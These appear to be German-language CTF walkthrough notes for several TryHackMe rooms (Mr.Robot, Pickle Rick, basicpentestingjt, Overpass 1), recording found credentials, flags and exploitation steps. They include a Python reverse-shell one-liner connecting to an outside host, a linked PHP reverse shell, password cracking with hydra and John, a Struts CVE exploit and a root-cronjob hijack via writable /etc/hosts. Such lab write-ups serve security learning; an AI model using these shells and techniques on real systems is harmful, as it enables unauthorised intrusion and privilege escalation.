# TryHackMe

## Mr.Robot

### Key 1
Hinweis in robots.txt gefunden:
```
GET http://10.10.237.208/robots.txt

User-agent: *
fsocity.dic
key-1-of-3.txt

```
```
GET http://10.10.237.208/key-1-of-3.txt

073403c8a58a1f80d943455fb30724b9
```

Die Datei fsocity.dic ist ein Dictionary welche mögliche Passwörter beinhaltet. In der Datei steht alles doppelt und dreifach es empfiehlt sich die Datei vorher zu bereinigen.
```
sort fsocity.dic | uniq > unicFsocity
```

### Key 2 
Tipp: White coloured font



### wordpress 
logins
user: ```Elliot```
passwd: ```ER28-0652```

user: ```mich05654```
passwd: ```Dylan_2791```

Von dort kann man eine [Reverse Shell mit PHP](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php) auf machen und sich als user `deamon` anmelden.
Es gibt einen Benutzer namens `robot`. In seine Home-Verzeichnis liegen folgende Dateien:
```
$ ls -al /home/robot
total 16
drwxr-xr-x 2 root  root  4096 Nov 13  2015 .
drwxr-xr-x 3 root  root  4096 Nov 13  2015 ..
-r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt
-rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5
```

Inhalt von `password.raw-md5`:
```
robot:c3fcd3d76192e4007dfb496cca67e13b
```
Dazu existiert ein Eintrag in einem Rainbow-Table: 
```
abcdefghijklmnopqrstuvwxyz
```

Die Shell konnten wir mit folgendem Befehl upgraden:
```
python -c 'import pty; pty.spawn("/bin/bash")'
```

Dadurch konnten wir uns als `robot` anmelden und die 2te Flag auslesen:
```
robot@linux:/$ cat /home/robot/key-2-of-3.txt
822c73956184f694993bede3eb39f959
```

#### Web Console
prints "Mr. Robot : Who Is Mr. Robot : \<Topic like FSociety Gallery\> : Potho"


### commands

#### prepare
trailer like, we will take 100.000$ and give it to you ... whoismrrobot.com

#### fsociety
```are you reade to join fsociety ?```

#### inform
article 1
stports hero cheated -> Mr Robot oure fault to choose him as a hero

article 2 *(first article look different)*
bilionair builds roket -> Mr Robot we give him all oure money, let him go and screw another planet

article 3
middle easr credit card usage/infection spreads
Mr Robot laughst that they will get dept and that this is not a solution
also Mr Robot will/has delete the world's debt

#### question
patriot executive capitalist businessman + sprüche

#### wakeup
trailer, 1% stuff

#### join 
you can enter an email address and it will be posted to the server at /join
but you dont get an email
*vulnerability?*

### not the falg
c3fcd3d76192e4007dfb496cca67e13b


---

## Pickle Rick

Server: ```10.10.115.113```
Paths
- /login.php
- /assests
- /robots.txt

login username: ```R1ckRul3s``` 
*(found in page source code)*
password: ```Wubbalubbadubdub```
*(found on robots.txt)*

### useless
base64 code on /portal.php source code
```
Vm1wR1UxTnRWa2RUV0d4VFlrZFNjRlV3V2t0alJsWnlWbXQwVkUxV1duaFZNakExVkcxS1NHVkliRmhoTVhCb1ZsWmFWMVpWTVVWaGVqQT0==
```

-> rabbit hole

#### python3 script

```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

### Antwort 1:
```mr. meeseek hair```
*(beim einloggen in der web shell, mit ls -lah)*

### Antwort 2:
```1 jerry tear```
*(ricks home folder)*

### Antwort 3:
```fleeb juice```
*(in history of user ubuntu; or in /root/3rd.txt)*



---


## basicpentestingjt

### SSH
- Gecrackt mit hydra *(rockyou.txt)*
- Der Benutzername stand in einer Datei auf dem Samba "guest share" 
*(ohne credentials; file: staff.txt)*
```
user: jan
pw: armando

user: kay
ssh private key pass: beeswax
```

### Apache Struts CVE
- Information gefunden in http://10.10.58.211/development/dev.txt
- Ein Archiv fuer die besondere Version von Apache Struts mit dem erwähnten REST Plugin befindet sich in /opt.
Daraus ergibt sich folgende URL: http://10.10.58.211:8080/struts2-rest-showcase-2.5.12
- CVE-2017–9805
- CVE Exploit Walktrough: http://www.sec-art.net/2020/02/exploiting-apache-struts25-rest-plugin.html
Exploit Script: https://www.exploit-db.com/exploits/42627

### Tomcat
Der Benutzername konnte durch den obrige Exploit aus /opt/tomcat-latest/conf/tomcat-users.xml entommen werden.
```
user: tomcat1
pw: changethistomcatpasslater
```

### Final
Der private Key von kay konnte von allen gelesen werden. Wir haben den Key kopiert und mit JohnTheRipper geknackt. *(pw: beeswax)*
```
heresareallystrongpasswordthatfollowsthepasswordpolicy$$
```

## Overpass 1
```
Enter /admin area by setting the cookie SecretToken to anything

SSH private key encryption password of user james: james13

users.txt: thm{65c1aaf000506e56996822c6281e6bf7}

.overpass encoded password for user james: saydrawnlyingpicture

/etc/host is writeable for everyone and there is a root cronjob that is being executed every minute downloading a script from overpass.thm and executing it
host your own script and modify /etc/host with your ip, we wrote "usermod -aG sudo james"

root.txt: thm{7f336f8c359dbac18d54fdd64ea753bb}
```